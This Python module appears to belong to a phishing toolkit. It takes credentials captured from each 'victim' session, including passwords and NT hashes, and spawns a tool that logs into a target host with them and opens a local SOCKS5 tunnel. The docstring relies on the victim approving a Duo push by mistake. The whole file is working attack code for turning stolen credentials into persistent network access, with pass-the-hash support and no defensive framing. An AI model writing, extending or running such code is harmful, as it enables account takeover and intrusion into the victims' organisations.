"""Kill-chain handoff: captured creds -> rdetour warm SOCKS tunnel.

Spawns rdetour.py per captured session — one warm tunnel per victim, with
all survival logic (channel cycling, first-contact gate, blackhole drain,
kill cache, keepalive). Ports allocated from --socks-port base+n.

Auth timeout is 90s — the victim may approve the Duo push thinking it's
part of their login.
"""
import asyncio
import os
import sys

RDETOUR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                       "rdetour.py")


def log(*a):
    print("[killchain]", *a, flush=True)


class KillChain:
    def __init__(self, cfg):
        self.cfg = cfg
        self.procs = {}
        self._lock = asyncio.Lock()

    def next_port(self):
        return self.cfg.socks_port_base + len(self.procs)

    def creds_ok(self, sess):
        c = sess.data.get("credentials") or {}
        return bool(c.get("username")) and c.get("password") is not None \
            and bool(c.get("domain"))

    async def arm(self, sess):
        if self.cfg.no_killchain:
            log("disabled; creds are in %s"
                % os.path.join(sess.dir, "session.json"))
            return None
        async with self._lock:
            if sess.sid in self.procs:
                return self.procs[sess.sid][0]
            if not self.creds_ok(sess):
                log("sid=%s: no usable creds captured" % sess.sid)
                return None
            c = sess.data["credentials"]
            domain = c["domain"]
            port = self.next_port()

        argv = [
            sys.executable, RDETOUR,
            "-g", self.cfg.target_host,
            "--gport", str(self.cfg.target_port),
            "-d", domain,
            "-u", c["username"],
            "-p", c["password"],
            "--socks-host", "127.0.0.1",
            "--socks-port", str(port),
            "--auth-timeout", "90",
        ]
        if c.get("nthash"):
            argv.extend(["--hashes", ":%s" % c["nthash"]])
        log("sid=%s: rdetour warm tunnel as %s\\%s on :%d"
            % (sess.sid, domain, c["username"], port))
        try:
            child_log = open(os.path.join(sess.dir, "rdetour.log"),
                             "ab", buffering=0)
        except Exception as e:
            log("child log open failed:", repr(e))
            return None
        try:
            proc = await asyncio.create_subprocess_exec(
                *argv, stdout=child_log, stderr=asyncio.subprocess.STDOUT)
        except Exception as e:
            child_log.close()
            log("spawn failed:", repr(e))
            return None
        async with self._lock:
            self.procs[sess.sid] = (port, proc)
        sess.data["killchain"] = {
            "socks_host": "127.0.0.1", "socks_port": port,
            "pid": proc.pid,
            "identity": "%s\\%s" % (domain, c["username"]),
        }
        sess.event("killchain_armed", socks_port=port, pid=proc.pid)
        log("sid=%s: SOCKS5 127.0.0.1:%d as %s\\%s via %s (log: %s)"
            % (sess.sid, port, domain, c["username"], self.cfg.target_host,
               os.path.join(sess.dir, "rdetour.log")))
        return port

    async def stop_all(self):
        async with self._lock:
            procs = list(self.procs.values())
            self.procs.clear()
        for port, proc in procs:
            try:
                proc.terminate()
            except Exception:
                pass
        for port, proc in procs:
            try:
                await asyncio.wait_for(proc.wait(), timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        if procs:
            log("stopped %d rdetour children" % len(procs))
